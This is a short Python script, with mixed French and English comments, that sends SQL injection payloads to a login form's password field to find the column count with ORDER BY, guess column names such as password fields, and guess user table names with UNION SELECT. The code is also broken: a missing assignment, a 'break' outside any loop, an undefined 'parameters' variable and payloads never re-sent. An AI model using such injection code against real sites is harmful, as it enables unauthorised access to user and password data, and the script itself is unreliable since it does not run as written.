#!C:\Python36/python.exe
#script injection in order to know number of column
import httplib, urllib
site="127.0.0.1"
port=80
page"/path"

nombre=-1
injection="' ORDER BY "+str(nombre)+"#"
print(injection)
params= urllib.urlencode({'identif':'koreth','mdp':injection,'ref':'identification','valider':'Valider'})
headers={"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}
conn = httplib.HTTPConnection(site+":"+str(port))
conn.request("POST",page,parameters,headers)
rep=conn.getresponse();
page_retour= rep.read()
if 'Error' in page_retour:
    break
nombre=nombre+1
print("The number of column is :",nombre-1)

#champ valide
liste= []
for nom in ('identif','id','identification','numero','nom','prenom','pass','passwd','password','motdepasse','mpd'):
    injection="' ORDER BY "+nom+"#"
    print(injection)
    conn.request("POST",page,parameters,headers)
    rep=conn.getresponse();
    page_retour= rep.read()
    if  not ('Error' in page_retour):
        liste.append(nom)
print("La liste des champs valide est: ",liste)

#guess the nom of the table
for nom in ('uses','user','utilisateurs','identifiant','identifiants','login','log','client'):
    injection="' UNION SELECT nom, prenom FROM "+nom+"#"
    print(injection)
    conn.request("POST",page,parameters,headers)
    rep=conn.getresponse();
    page_retour= rep.read()
    if not('Erreur' in page_retour):
        break
print("nom of the table ",nom)



conn.close()
